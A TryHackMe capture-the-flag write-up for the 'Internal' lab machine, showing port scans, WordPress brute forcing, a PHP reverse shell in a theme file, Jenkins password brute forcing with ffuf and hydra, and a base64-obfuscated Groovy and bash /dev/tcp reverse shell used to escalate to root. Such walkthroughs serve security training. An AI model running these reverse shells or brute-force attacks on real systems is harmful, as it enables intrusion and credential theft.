---
title: Internal - TryHackMe
date: 2024-6-1 00:00:00 +/-TTTT
categories: [TryHackMe]
tags: [tryhackme, writeup, penetration testing, wordpress, local port forwarding]     # TAG names should always be lowercase
---



<br />

First, We need to edit the **host’s** file.

```bash
echo "10.10.192.152    internal.thm" | sudo tea -a /etc/hosts
```

<br />

## Scanning

**Port scanning** 

```bash
root@ip-10-10-228-42:~# nmap internal.thm

Starting Nmap 7.60 ( https://nmap.org ) at 2024-06-29 00:21 BST
Nmap scan report for internal.thm (10.10.192.152)
Host is up (0.00031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:B6:D3:8C:12:49 (Unknown)
```

<br />

**Aggressive port scanning** 

```bash
root@ip-10-10-228-42:~# nmap internal.thm -A

Starting Nmap 7.60 ( https://nmap.org ) at 2024-06-29 00:23 BST
Nmap scan report for internal.thm (10.10.192.152)
Host is up (0.00047s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:B6:D3:8C:12:49 (Unknown)
```

<br />



**Scan all ports** 

```bash
root@ip-10-10-228-42:~# nmap internal.thm -p- -T5 -v

Starting Nmap 7.60 ( https://nmap.org ) at 2024-06-29 00:22 BST
Initiating ARP Ping Scan at 00:22
Scanning internal.thm (10.10.192.152) [1 port]
Completed ARP Ping Scan at 00:22, 0.23s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 00:22
Scanning internal.thm (10.10.192.152) [65535 ports]
Discovered open port 22/tcp on 10.10.192.152
Discovered open port 80/tcp on 10.10.192.152
Warning: 10.10.192.152 giving up on port because retransmission cap hit (2).
SYN Stealth Scan Timing: About 18.27% done; ETC: 00:25 (0:02:19 remaining)
SYN Stealth Scan Timing: About 39.75% done; ETC: 00:25 (0:01:32 remaining)
SYN Stealth Scan Timing: About 61.45% done; ETC: 00:25 (0:00:57 remaining)
Completed SYN Stealth Scan at 00:25, 188.50s elapsed (65535 total ports)
Nmap scan report for internal.thm (10.10.192.152)
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```



<br /><br />

## Enumeration

**Directory bruteforce** 

```bash
root@ip-10-10-228-42:~# gobuster dir -u http://internal.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://internal.thm
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2024/06/29 00:22:17 Starting gobuster
===============================================================
/blog (Status: 301)
/wordpress (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================
```

<br />

As it is a wordpress site, we can enumerate further using the WPScan tool.

<br />

**Enumerate wordpress users using wpscan**

```bash
root@ip-10-10-228-42:~# wpscan  --url  http://internal.thm/blog/  --enumerate u  
_______________________________________________________________
         __          _______   _____
         / /        / /  __ / / ____|
          / /  //  / /| |__) | (___   ___  __ _ _ __ ®
           / //  // / |  ___/ /___ / / __|/ _` | '_ /
            /  //  /  | |     ____) | (__| (_| | | | |
             //  //   |_|    |_____/ /___|/__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________


[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

`admin` user is found

<br /><br />

**Bruteforce admin password**

```bash
root@ip-10-10-228-42:~# wpscan  --url  http://internal.thm/blog/  -U admin -P  /usr/share/wordlists/rockyou.txt 
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                                                                                                                                                                        
Trying admin / ionela Time: 00:00:44 <                                                                                                                                    > (3885 / 14348276)  0.02%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: admin, Password: m******
```

with these credentials you can login to the wordpress admin panel

<br /><br />

**From the posts page, i found a private post** 

![](/assets/img/thm/internal/0.png)

<br /><br />

**There was a to-do message with credentials.** 
**Note:** these are not useful credentials

![](/assets/img/thm/internal/1.png)

<br /><br />

## Exploitation

**Now we need a reverse shell**

Go to Appearance → Theme Editor → **404.php**

I used pentester monkey's reverse shell and started a netcat listener

![](/assets/img/thm/internal/2.png)

<br /><br />

Go to any page that does not found to execute the reverse shell (or go to /wp-content/themes/twentyseventeen/404.php)

![](/assets/img/thm/internal/3.png)



<br /><br />



![](/assets/img/thm/internal/4.png)

<br /><br />

**From manual enumeration i found  Database credentials in `wp-config.php`**

![](/assets/img/thm/internal/5.png)

<br /><br />

**I logged into the phpMyAdmin with these credentials `wordpress:wordpress123` but i did not find anything useful**

![](/assets/img/thm/internal/6.png)

<br /><br />

## Privilege escalation

**I executed linPEAS to automate the privilege escalation process**

From linPEAS, I found that the machine was listening locally to port 8080. but we need ssh credentials to figure out what is running.

```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#internal-open-ports
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:35995         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.192.152:54514     10.10.228.42:1234       ESTABLISHED 2208/sh             
tcp        0      0 10.10.192.152:54512     10.10.228.42:1234       ESTABLISHED 2096/sh             
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       1      0 10.10.192.152:80        10.10.228.42:55796      CLOSE_WAIT  -                   
tcp6       1      0 10.10.192.152:80        10.10.228.42:53484      CLOSE_WAIT  -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.192.152:68        0.0.0.0:*    
```

<br />

**When enumerating common files and directories, the `/opt` directory seemed to contain some credentials for the “aubreanna” user**

![](/assets/img/thm/internal/7.png)

<br />

**Now we have the SSH credentials** 

![](/assets/img/thm/internal/8.png)

<br />



**From `jenkins.txt` in the home directory**

![](/assets/img/thm/internal/9.png)

<br />

**The machine has docker running on it with ip `172.17.0.1`**

![](/assets/img/thm/internal/11.png)

<br />

**SSH local port forwarding**

![](/assets/img/thm/internal/12.2.png)

<small>image source:   <i>https://unix.stackexchange.com/questions/115897/whats-ssh-port-forwarding-and-whats-the-difference-between-ssh-local-and-remot</i>i></small>



<br /><br />

**Since port 8080 can only be accessed locally, setting up port forwarding in order to redirect traffic to localhost on port 8484 to the target machine on port 8080:**



![](/assets/img/thm/internal/12.png)



<br /><br />

**From our browser, go to `localhost:8484`**

There was jenkins running. Now we need jenkins credentials.

I tried some default credentials, but with no luck. So I tried bruteforce with `admin` user

![](/assets/img/thm/internal/13.png)

<br /><br />

**Save the request in a file**



![](/assets/img/thm/internal/14.png)

<br /><br />



**Replace the password with `FUZZ`**

![](/assets/img/thm/internal/15.png)

<br /><br />

**Bruteforce the password with ffuf**

```bash
root@ip-10-10-228-42:~/Desktop# ffuf -request jenkins_req -request-proto http -w /usr/share/wordlists/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -r  -fs 901,0
```

-r to follow redirection.

-fs to filter HTTP response size.

![](/assets/img/thm/internal/15.2.png)

<br /><br />

**Bruteforce with hydra**

```bash
hydra localhost -f http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -s 8484 -V -l admin -P /usr/share/wordlists/rockyou.txt
```



<br /><br />

**Log into jenkins**

Now we can get a reverse shell.

Go to Manage Jenkins –>Script Console , write a Groovy reverse shell and  start a netcat listener

```bash
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQzNDMgMD4mMScK}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

The above code executes a bash reverse shell command encoded in base64

```bash
bash -c 'bash -i >& /dev/tcp/172.17.0.1/4343 0>&1'
```

<br />

```bash
root@ip-10-10-228-42:~# echo "bash -c 'bash -i >& /dev/tcp/172.17.0.1/4343 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzQzNDMgMD4mMScK
```

<br />

![](/assets/img/thm/internal/16.png)



<br /><br />

**Now we have access as the jenkins user within a Docker container**

![](/assets/img/thm/internal/17.png)



<br /><br />

**I found the root user in the `/opt` directory** 

![](/assets/img/thm/internal/18.png)

<br /><br />



**Authenticating as root through SSH with the credentials found:**

![](/assets/img/thm/internal/19.png)
